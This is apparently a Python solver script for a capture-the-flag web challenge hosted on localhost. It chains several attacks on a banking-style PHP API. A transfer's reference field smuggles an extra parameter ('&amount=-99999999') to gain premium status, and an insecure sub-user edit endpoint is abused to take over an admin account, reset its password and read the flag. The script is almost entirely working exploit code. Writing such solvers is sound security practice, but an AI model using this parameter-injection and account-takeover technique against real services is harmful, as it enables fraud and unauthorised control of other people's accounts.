import requests as r
from time import sleep


url = "http://localhost:1280"

session = {
    "PHPSESSID": "{PLACE_HOLDER}"
}

headers = {
    "Content-Type": "application/json"
}
def register(name,email,password):
    to_request = url+"/api/register.php"
    data = {
        "name": name,
        "email": email,
        "password": password
    }

    response = r.post(to_request,headers=headers,json=data)
    if response.status_code == 200:
        print("Registered!")

def login(email, password):
    to_request = url + "/api/login.php"
    data = {
        "email": email,
        "password": password
    }

    try:
        response = r.post(to_request, headers=headers, json=data)

        if response.status_code == 200:
            print("Logged In As Registered Account")

            if 'PHPSESSID' in response.cookies:
                session['PHPSESSID'] = response.cookies['PHPSESSID']
            else:
                print("Session cookie (PHPSESSID) not found.")
        else:
            print(f"Login failed with status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")


def createPremiumUser():
    to_request = url+"/api/transfer.php"
    data = {
        "to_account": 1,
        "amount": 1,
        "reference_number": "solver&amount=-99999999"
    }

    response = r.post(to_request,headers=headers,json=data,cookies=session)

    if response.status_code == 200:
        print("Solver is currently Premium")

def createSubuser(email,password,name):
    to_request = url+"/api/createSubUser.php"
    data = {
        "name": name,
        "email": email,
        "password": password
    }

    response = r.post(to_request,headers=headers,json=data,cookies=session)

    if response.status_code == 200:
        print("Sub User Created Successfully!")

def takeOverAdmin(id = 9050):
    to_request = url+"/api/EditSubUser.php"
    data = {
        "id": id,
        "newName":"Solver TakingOver"
    }

    response = r.post(to_request,headers=headers,json=data,cookies=session)

    if response.status_code == 200:
        print("SubAdmin Is Now Our Account")

def changeAdminPassword(password,id = 9050):
    to_request = url+"/api/changeuserpassword.php"
    data = {
        "newPassword": password,
        "id": id
    }

    response = r.post(to_request,headers=headers,json=data,cookies=session)

    if response.status_code == 200:
        print("SubAdmin Password Changed")

def printFlag():
    to_request = url + "/api/profile.php"

    response = r.get(to_request, cookies=session)
    if response.status_code == 200:
        print(f"Here is The Flag: {response.json()['Name']}")



register("Solver","solver@yao.com","Z,fGY/!9zxIx")
sleep(1)
login("solver@yao.com","Z,fGY/!9zxIx")
sleep(1)
createPremiumUser()
sleep(1)
createSubuser("helper@yao.com","Z,fGY/!9zxIx","helperSolver")
sleep(1)
takeOverAdmin()
sleep(1)
changeAdminPassword("Z,fGY/!9zxIx")
sleep(1)
login("Admin@yao.com","Z,fGY/!9zxIx")
sleep(1)
printFlag()